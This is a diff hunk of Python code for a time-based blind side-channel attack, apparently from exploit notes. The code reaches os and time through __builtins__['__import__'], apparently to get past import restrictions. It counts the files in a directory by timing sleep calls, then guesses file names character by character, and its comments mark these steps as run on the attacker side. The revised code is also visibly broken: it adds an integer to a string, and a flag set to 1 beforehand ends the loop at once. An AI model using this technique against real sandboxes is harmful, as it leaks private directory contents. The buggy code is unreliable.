@@ -156,14 +156,21 @@ for n in range(0,30):                                                  # This wi
     if __builtins__['__import__']('os').listdir(cdir).__len__()==n:
         __builtins__['__import__']('time').sleep(20)
 
-# GUESS : File names given path and number of files
+# GUESS : File names len<20 given path and number of files
 import string                                                # This will be on attacker side
-char_set = string.ascii_letters + '0123456789' + '/-'        # This will be on attacker side
-for file_index in ndir:                                      # This will be on attacker side
-    for char_index in range(0,20)                            # This will be on attacker side
+char_set = string.ascii_letters + '0123456789' + '/-\n'      # This will be on attacker side
+flag = 1
+for file_index in range(0,ndir):                             # This will be on attacker side
+    for char_index in range(0,20):                           # This will be on attacker side
         for ele in char_set:                                 # This will be on attacker side
-            __builtins__['__import__']('os').listdir(cdir)[file_index][char_index]==ele:
-            sleep(3)
+            if __builtins__['__import__']('os').listdir(cdir)[file_index][char_index]==ele:
+                # __builtins__['__import__']('time').sleep(20)                                 # Real command
+                print(file_index + "file name is : " + ele + "\n")                             # For simplicity of this.
+                if(ele == '\n'):
+                    flag=1
+                    break
+        if (flag ==1):
+            break
 
 
 ```
